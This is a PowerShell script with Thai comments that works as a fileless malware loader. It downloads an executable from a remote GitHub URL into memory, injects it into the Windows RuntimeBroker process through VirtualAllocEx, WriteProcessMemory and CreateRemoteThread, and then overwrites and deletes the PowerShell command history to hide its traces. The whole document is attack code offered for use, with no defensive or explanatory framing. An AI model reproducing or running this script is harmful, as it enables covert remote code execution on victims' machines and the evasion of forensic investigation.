# --- 1. ตั้งค่าพื้นฐาน ---
$url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
$targetName = "RuntimeBroker"

# นิยาม Win32 API โดยใช้ Type เต็มรูปแบบของ .NET (ป้องกัน Error [uint])
$Signature = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

try {
    # โหลด Definition (ใช้ ErrorAction เพื่อไม่ให้แจ้งเตือนหากโหลดซ้ำ)
    Add-Type -TypeDefinition $Signature -ErrorAction SilentlyContinue

    Write-Host "[*] Downloading C++ Payload to RAM..." -ForegroundColor Cyan
    $wc = New-Object System.Net.WebClient
    $exeBytes = $wc.DownloadData($url)

    # 2. ค้นหา Process เป้าหมาย
    $proc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($null -eq $proc) { throw "ไม่พบ Process $targetName ในระบบ" }

    # 3. เปิดสิทธิ์การเข้าถึง Process (0x1F0FFF = PROCESS_ALL_ACCESS)
    $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
    if ($hProc -eq [IntPtr]::Zero) { throw "เข้าถึง Process ไม่ได้ (กรุณารันในฐานะ Admin)" }

    # 4. จองพื้นที่หน่วยความจำใน Process เป้าหมาย
    # 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
    $remoteMem = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint]$exeBytes.Length, 0x3000, 0x40)
    if ($remoteMem -eq [IntPtr]::Zero) { throw "ไม่สามารถจองหน่วยความจำได้" }

    # 5. เขียน Code เข้าไปใน RAM ของเป้าหมาย
    $written = 0
    $success = [Win32]::WriteProcessMemory($hProc, $remoteMem, $exeBytes, [uint]$exeBytes.Length, [ref]$written)

    # 6. สั่ง Execute ผ่าน Remote Thread
    if ($success) {
        Write-Host "[*] Successfully injected into $($targetName) (PID: $($proc.Id))" -ForegroundColor Green
        [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    }

} catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    # --- 7. ลบประวัติร่องรอยทั้งหมด ---
    Write-Host "[*] Cleaning up traces..." -ForegroundColor Magenta
    $history = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $history) { 
        # เขียนทับประวัติด้วยค่าว่างก่อนลบ
        "" | Out-File $history 
        Remove-Item $history -Force -ErrorAction SilentlyContinue
    }
    Clear-History
    
    # ปิด Session ทันที
    exit
}
